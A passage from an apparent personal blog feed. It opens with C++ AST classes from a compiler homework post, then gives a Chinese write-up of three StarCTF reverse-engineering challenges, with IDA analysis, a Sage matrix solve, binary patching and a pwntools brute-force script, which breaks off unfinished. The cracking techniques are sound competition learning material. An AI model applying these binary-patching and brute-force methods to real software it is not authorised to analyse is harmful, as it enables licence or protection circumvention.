class="hljs-built_in">string</span>(<span class="hljs-string">&quot;UnaryExpr(&quot;</span>) + Op + <span class="hljs-string">&quot;,&quot;</span> + getString(Expr) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><br><span class="hljs-comment">// IfStmt(expr condition, block if_block, block? else_block)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IfStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>ExprAST * ConditionExpr;<br>BlockAST * IfBlock;<br>BlockAST * ElseBlock;<br><br><span class="hljs-keyword">public</span>:<br>IfStmtAST(ExprAST * condition, BlockAST * ifblock, BlockAST * elseblock): ConditionExpr(condition), IfBlock(ifblock), ElseBlock(elseblock) &#123;&#125;;<br>~IfStmtAST() &#123;<br><span class="hljs-keyword">if</span> ( ConditionExpr ) <span class="hljs-keyword">delete</span> ConditionExpr;<br><span class="hljs-keyword">if</span> ( IfBlock ) <span class="hljs-keyword">delete</span> IfBlock;<br><span class="hljs-keyword">if</span> ( ElseBlock ) <span class="hljs-keyword">delete</span> ElseBlock;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;IfStmt(&quot;</span>) + getString(ConditionExpr) + <span class="hljs-string">&quot;,&quot;</span> + getString(IfBlock) + <span class="hljs-string">&quot;,&quot;</span> + getString(ElseBlock) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// WhileStmt(expr condition, block while_block)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhileStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>ExprAST * ConditionExpr;<br>BlockAST * WhileBlock;<br><br><span class="hljs-keyword">public</span>:<br>WhileStmtAST(ExprAST * cond, BlockAST * block): ConditionExpr(cond), WhileBlock(block) &#123;&#125; ;<br>~WhileStmtAST() &#123;<br><span class="hljs-keyword">if</span> ( ConditionExpr ) <span class="hljs-keyword">delete</span> ConditionExpr;<br><span class="hljs-keyword">if</span> ( WhileBlock ) <span class="hljs-keyword">delete</span> WhileBlock;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;WhileStmt(&quot;</span>) + getString(ConditionExpr) + <span class="hljs-string">&quot;,&quot;</span> + getString(WhileBlock) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// ForStmt(assign* pre_assign_list, expr condition, assign* loop_assign_list, block for_block)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>decafStmtList * PreAssignList;<br>ExprAST * Condition;<br>decafStmtList * LoopAssignList;<br>BlockAST * ForBlock;<br><span class="hljs-keyword">public</span>:<br>ForStmtAST(decafStmtList * pre_assign_list, ExprAST * condition, decafStmtList * loop_assign_list, BlockAST * for_block):<br>PreAssignList(pre_assign_list), Condition(condition), LoopAssignList(loop_assign_list), ForBlock(for_block) &#123;&#125;;<br>~ForStmtAST() &#123;<br><span class="hljs-keyword">if</span> ( PreAssignList ) <span class="hljs-keyword">delete</span> PreAssignList;<br><span class="hljs-keyword">if</span> ( Condition ) <span class="hljs-keyword">delete</span> Condition;<br><span class="hljs-keyword">if</span> ( LoopAssignList ) <span class="hljs-keyword">delete</span> LoopAssignList;<br><span class="hljs-keyword">if</span> ( ForBlock ) <span class="hljs-keyword">delete</span> ForBlock;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ForStmt(&quot;</span>) + getString(PreAssignList) + <span class="hljs-string">&quot;,&quot;</span> + getString(Condition) + <span class="hljs-string">&quot;,&quot;</span> + getString(LoopAssignList) + <span class="hljs-string">&quot;,&quot;</span> + getString(ForBlock) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// ReturnStmt(expr? return_value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReturnStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>ExprAST * ReturnValue;<br><span class="hljs-keyword">public</span>:<br>ReturnStmtAST(ExprAST * return_value): ReturnValue(return_value) &#123;&#125;;<br>~ReturnStmtAST() &#123;<br><span class="hljs-keyword">if</span> ( ReturnValue ) <span class="hljs-keyword">delete</span> ReturnValue;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ReturnStmt(&quot;</span>) + getString(ReturnValue) + <span class="hljs-string">&quot;)&quot;</span>; <br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// BreakStmt</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BreakStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;BreakStmt&quot;</span>); &#125;<br>&#125;;<br><br><span class="hljs-comment">// ContinueStmt</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContinueStmtAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ContinueStmt&quot;</span>); &#125;<br><br>&#125;;<br></code></pre></td></tr></table></figure><p>下一步？ 上 LLVM。</p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>StarCTF Reverse writeUp</title>
    <link href="/2021/01/18/StarCTF-Reverse-writeUp/"/>
    <url>/2021/01/18/StarCTF-Reverse-writeUp/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-Reverse-writeUp"><a href="#CTF-Reverse-writeUp" class="headerlink" title="*CTF Reverse writeUp"></a>*CTF Reverse writeUp</h1><p>由于水平问题，这次只做出来三道 RE 题，分别是 ChineseGame、stream、wherekey，其它 RE 题目等我复现官方 WP 后再来写。</p><p>题目下载</p><a href="/2021/01/18/StarCTF-Reverse-writeUp/files.zip" title="files.zip">files.zip</a><h2 id="ChineseGame"><a href="#ChineseGame" class="headerlink" title="ChineseGame"></a>ChineseGame</h2><p>题目名提示中国游戏，但是我做完这题之后也不知道到底是什么中国游戏23333。</p><p>这道题目的 binary 静态链接的 libc 库，没有符号，所以要手动的判断某些库函数。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><ol><li>有一个链表结构的初始化数组A</li><li>输入字符串为只含有01的字符串</li><li>01 序列对应两种操作: sub_404F06、 sub_404DD6，两种操作的对象是A数组</li><li>执行完所有01操作后，数组A中的值必须全部小于100</li></ol><h3 id="识别部分库函数"><a href="#识别部分库函数" class="headerlink" title="识别部分库函数"></a>识别部分库函数</h3><p>先识别出几个库函数</p><p>sub_4060D0: malloc</p><p>分析方法</p><p>找一下该函数的子函数，发现如下字符串，说明这个函数可能是 malloc，并且参数是一个数字，返回值是指针。</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118152819348.png" class="" title="image-20210118152819348"><p>sub_4C7600(): rand</p><p>分析方法：</p><ol><li>sub_4C7600() % 100 + 101   这种调用方式，自然联想到取某个范围内的随机数</li><li>递归进入分析该函数，发现某个子函数中有随机数方程</li></ol><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118153202919.png" class="" title="image-20210118153202919"><p>一般而言，随机数的种子相同，生成的随机数序列也相同。进过初步分析，该程序用的随机数种子为 0</p><p>其它几个函数主要是 C++ string 对象的函数，对于这种，一般可以通过观察调试时的数据确认。</p><h3 id="链表结构初始化数组A"><a href="#链表结构初始化数组A" class="headerlink" title="链表结构初始化数组A"></a>链表结构初始化数组A</h3><p>main 函数中调用初始化函数 sub_4052B4(v4, 10);  该函数对 v4 链表初始化。</p><p>v4 是一个链表，结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linklist</span>&#123;</span><br>Node * head; <span class="hljs-comment">// 8bytes</span><br>int64  num; <br>&#125;<br></code></pre></td></tr></table></figure><p>在 sub_4052B4 可以分析 Node 的结构体定义如下</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">struct <span class="hljs-keyword">Node</span><span class="hljs-title">&#123;</span><br><span class="hljs-title">int64</span> data;<br>struct <span class="hljs-keyword">Node</span> <span class="hljs-title">* next</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA 中支持定义结构体, 手动添加这两个结构体</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118160659890.png" class="" title="image-20210118160659890"><p>注意这是一个64位程序， 指针为64位，即 DQ，而不是32位的 DD.</p><p>sub_4052B4(v4, 10);  把第一个参数的类型改成 linklist *, 选中 a1 参数右键</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118154327217.png" class="" title="image-20210118154327217"><p>修改之后的效果如下:</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118154444099.png" class="" title="image-20210118154444099"><p>可见 v3 变量是刚分配的 Node 内存，继续修改 V3 的名字和数据类型为 Node *</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118154603480.png" class="" title="image-20210118154603480"><p>修改之后并没有太大的直观效果，因为该函数中会调用另外一个函数初始化 Node</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118154931044.png" class="" title="image-20210118154931044"><p>继续把 sub_405288 的第一个参数类型修改为 Node *</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118155026155.png" class="" title="image-20210118155026155"><p>其它地方与链表有关的都修复一下结构，逻辑就很清晰了。</p><p>搞清楚链表后，把整个链表抽象理解成数组，初始化函数初始的数组值固定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">184<br>86<br>178<br>116<br>194<br>136<br>187<br>193<br>150<br>122<br></code></pre></td></tr></table></figure><h3 id="01-序列对应两种操作-sub-404F06、-sub-404DD6"><a href="#01-序列对应两种操作-sub-404F06、-sub-404DD6" class="headerlink" title="01 序列对应两种操作: sub_404F06、 sub_404DD6"></a>01 序列对应两种操作: sub_404F06、 sub_404DD6</h3><p>sub_404F06(arr, x);<br>sub_404DD6(arr, x);</p><p>arr 就是前面分析的链表， x是 dword_5D5140[i],dword_5D5140 指定了当前操作位置。</p><p>意思是依次对 arr 数组<em>倒数</em>第 x 个元素操作, </p><p>操作有两种类型:<br>0、把x元素改成小于100<br>1、把x元素改成大于100</p><p>A操作的条件是: 数组中当前位置的下一个元素必须大于100，下下一个到最后一个元素必须小于100<br>B操作的条件是: 数组中当前位置的下一个元素必须大于100，下下一个到最后一个元素必须小于100</p><p>题目要求输入一个操作序列，使所有元素都小于100</p><p>数组中的数字只有两种状态，大于100或小于100，所以可以抽象为 01。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>可以先尝试手动选择01操作，使数组中的某些元素变成小于100，<br>大于100，小于100，可以抽象为1， 0，数组可以抽象为01序列: bits = [1, 0, 1, 1, 1, 1, 1, 1, 1, 1]<br>手动分析，就发现其实是一个递归结构。</p><p>solve  输出设置pos位为direct的操作方法。<br>设置倒数 pos 位为direct要求如下:<br>    bits[pos - 1] == 1  递归设置这个<br>    bits[pos - 2 … 1] 0 循环递归设置这个</p><p>编写递归函数如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1, 3, 1, 2, 1, 5,</span><br>FLAG = <span class="hljs-string">&#x27;&#x27;</span><br>FLAG2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">bits, pos, direct</span>):</span><br>    <span class="hljs-keyword">global</span> FLAG<br>    <span class="hljs-keyword">global</span> FLAG2<br>    bits = <span class="hljs-built_in">list</span>(bits)<br><br>    <span class="hljs-keyword">if</span> bits[<span class="hljs-number">10</span> - pos] == direct:<br>        <span class="hljs-keyword">return</span> bits<br><br>    <span class="hljs-keyword">if</span> pos == <span class="hljs-number">1</span>:<br>        bits[<span class="hljs-number">9</span>] = direct<br>        FLAG += <span class="hljs-string">&#x27;1, &#x27;</span><br>        FLAG2 += <span class="hljs-built_in">str</span>(direct)<br>    <span class="hljs-keyword">else</span>:<br>        bits = solve(bits, pos - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pos - <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            bits = solve(bits, i, <span class="hljs-number">0</span>) <span class="hljs-comment"># 顺序</span><br>        bits[<span class="hljs-number">10</span> - pos] = direct<br>        FLAG += <span class="hljs-built_in">str</span>(pos)+<span class="hljs-string">&#x27;, &#x27;</span><br>        FLAG2 += <span class="hljs-built_in">str</span>(direct)<br>    <span class="hljs-keyword">return</span> bits<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bits = [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        bits = solve(bits, i, <span class="hljs-number">0</span>)<br>        print(bits)<br>    print(FLAG)<br>    print(FLAG2)<br><br></code></pre></td></tr></table></figure><h2 id="wherekey"><a href="#wherekey" class="headerlink" title="wherekey"></a>wherekey</h2><p>这道题目直接启动可能会不成功，可以采用先运行再附加的方法调试。</p><p>题目结构不是很清晰，可以从找数据流入手，具体思路就是通过调试，找输入数据出现的位置，然后再找输入数据经过的处理代码。</p><p>402072 函数就是输入函数, 逻辑很混乱，若通过调试只观察数据的话，发现这段代码仅仅是简单的接收5字节输入，然后把输入的 flag 数据通过 socket 传递给其它地方。</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118170729252.png" class="" title="image-20210118170729252"><p>输入的 flag 传递到哪里了？经过简单的调试找到了下面这段代码 sub_4022DE 其中 v1 指向输入的字符串，v1的长度为5个字节，是输入的行向量</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118171107725.png" class="" title="image-20210118171107725"><p>v4 的计算如下:</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118171511325.png" class="" title="image-20210118171511325"><p>通俗讲，这个函数就是返回列向量, v4 就是下面这个矩阵的第 i 列向量，i从0开始。设该矩阵为A矩阵</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">flag&#123;<br>are_y<br>ou_su<br>re_fr<br>iend&#125;<br></code></pre></td></tr></table></figure><p>401E3E 地址上的函数是一个乘法函数( 有简单的花指令)</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118172337067.png" class="" title="image-20210118172337067"><p>把上面写的和矩阵乘法联想一下，就能推出如下公式</p><p>(flag * A) % 257 == B</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">B = [<br>     <span class="hljs-number">0x38</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xB9</span>, <br>     <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x5C</span>,<br>     <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD2</span>, <br>     <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x56</span>, <br>     <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x4F</span>]<br></code></pre></td></tr></table></figure><p>用 sega 解就可以得到 flag</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># sage<br>A =  [[<span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">103</span>, <span class="hljs-number">123</span>], [<span class="hljs-number">97</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">95</span>, <span class="hljs-number">121</span>], [<span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">95</span>, <span class="hljs-number">115</span>, <span class="hljs-number">117</span>], [<span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">95</span>, <span class="hljs-number">102</span>, <span class="hljs-number">114</span>], [<span class="hljs-number">105</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">125</span>]]<br>B = [<br>    [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xB9</span>],<br>    [<span class="hljs-number">0x8A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x5C</span>],<br>    [<span class="hljs-number">0x8A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD2</span>],<br>    [<span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x56</span>],<br>    [<span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x4F</span>]]<br>A = Matrix(Zmod(<span class="hljs-number">257</span>),A)<br>B = Matrix(Zmod(<span class="hljs-number">257</span>),B)<br>flag = B*A<span class="hljs-number">.</span>inverse()<br>for i <span class="hljs-keyword">in</span> flag:<br>    for j <span class="hljs-keyword">in</span> i:<br>        print(chr(j),end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><h2 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h2><p>第一次做 rust 逆向，体验还行 233</p><p>直接运行 stream 会报错，因为缺少 flag 文件。</p><p>flag -&gt; 题目 -&gt; output</p><p>已知 output 求输入flag</p><p>很容易找到如下代码，左侧数据是输入的文件字节流，右侧是一个字节的密钥。</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118173712672.png" class="" title="image-20210118173712672"><p>加密次序不是依次加密的，而是按照如下次序加密（target是输入文件）:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pos_table</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">v0</span> = <span class="hljs-number">4</span><br><span class="hljs-attribute">for</span> i in range(len(target)):<br>    <span class="hljs-attribute">pos_table</span>.append(v<span class="hljs-number">0</span> % len(target))<br>    <span class="hljs-attribute">v0</span> += <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>pos_table 是加密下标表。</p><p>这道题的重点就是密钥生成算法，密钥生成算法是用的 rust 随机数库，我们把这个算法抽象成 ENC(T), 那么整个程序的逻辑如下</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs inform7">flag = <span class="hljs-comment">[0]</span> * 32<br>key_buffer = <span class="hljs-comment">[0]</span> * len(flag)<br>k = 4<br>for i in range(len(flag)):<br>    pos = k % len(flag)<br>    key_buffer<span class="hljs-comment">[i % 32]</span> = flag<span class="hljs-comment">[pos]</span><br>    flag<span class="hljs-comment">[pos]</span>  ^= ENC(key_buffer)<span class="hljs-comment">[0]</span><br>    k += 7<br>print(flag) # 已经知道这里的flag，求输入<br></code></pre></td></tr></table></figure><p>密钥生成算法只和 key_buffer 有关，key_buffer 每次都变，如下:</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">5</span>:   46<br><span class="hljs-attribute">5B</span>:  3B<br><span class="hljs-attribute">5BI</span>: C8<br><span class="hljs-attribute">5BIP</span>: EE<br><span class="hljs-attribute">5BIPW</span>: F2<br><span class="hljs-attribute">5BIPW3</span>: 95<br></code></pre></td></tr></table></figure><p> 爆破思路是依次爆破key_buffer。</p><p>例如第一轮的时候，尝试 m = [ENC(‘\x30’) … ENC(‘\x80’) ] 所有取值，并找出满足m[x] ^ x == x 的值作为解。主要解不唯一，因此要DFS遍历所有情况。 确认第一位后，再爆破第二位，依次类推，直到 46 位。</p><p>ENC 实际上是 rust 随机数函数，为了方便，直接 patch 源程序使其能实现 ENC的输入输出。</p><p>patch 方法如下:</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118213539691.png" class="" title="image-20210118213539691"><p>V9 就是keybuffer，使这个第二个参数改为输入文件缓冲区</p><p>修改如下代码为赋值语句，可以直接输出 ENC 结果到文件</p><img src="/2021/01/18/StarCTF-Reverse-writeUp/image-20210118213650476.png" class="" title="image-20210118213650476"><p>patch 完成后，运行patch之后的程序，flag 文件相当于  ENC 的参数，output 相当于 ENC 的返回值。</p><p>编写爆破脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output_1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><br><br>target = data<br>pos_table = []<br>v0 = <span class="hljs-number">4</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target)):<br>    pos_table.append(v0 % <span class="hljs-built_in">len</span>(target))<br>    v0 += <span class="hljs-number">7</span><br><br>dfs([<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(target), [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(target), <span class="hljs-number">0</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_m</span>(<span class="hljs-params">keyset</span>):</span><br>    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>    fd.write(<span class="hljs-built_in">bytearray</span>(keyset))<br>    fd.close()<br>    p = process(<span class="hljs-string">&#x27;./a&#x27;</span>)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    p.close()<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">0</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_test_key</span>(<span class="hljs-params">keyset, i</span>):</span><br>    test_key = [<span class="hljs-number">0</span>] * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>        test_key[k1 % <span class="hljs-number">32</span>] = keyset[k1]<br>    <span class="hljs-keyword">return</span> test_key<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_m</span>(<span class="hljs-params">keyset, i, tar</span>):</span><br>    data1 = <span class="hljs-built_in">bytearray</span>(keyset)<br>    set1 = []<br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        data1[i] = v<br>        data2 = make_test_key(data1, i + <span class="hljs-number">1</span>)<br>        m = get_m(data2)<br>        <span class="hljs-comment">#print(&quot;test: &quot;, data1, &quot;m:&quot;, m)</span><br>        <span class="hljs-keyword">if</span> tar ^  m == v:<br>            set1.append(v)<br>    <span class="hljs-keyword">return</span> set1<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">keyset, ans, i</span>):</span><br>    prefix = <span class="hljs-string">&#x27; &#x27;</span> * i<br>    pos = pos_table[i]<br>    k = calc_m(keyset, i, target[pos]) <span class="hljs-comment">#calc_m 计算keyset第i位值为0-255的所有取值</span><br><br>    print(prefix, <span class="hljs-string">&quot;Acurrent i:%d pos:%d &quot;</span> % (i, pos))<br>    print(prefix, <span class="hljs-built_in">bytearray</span>(keyset[<span class="hljs-number">0</span>:i]))<br>    <span 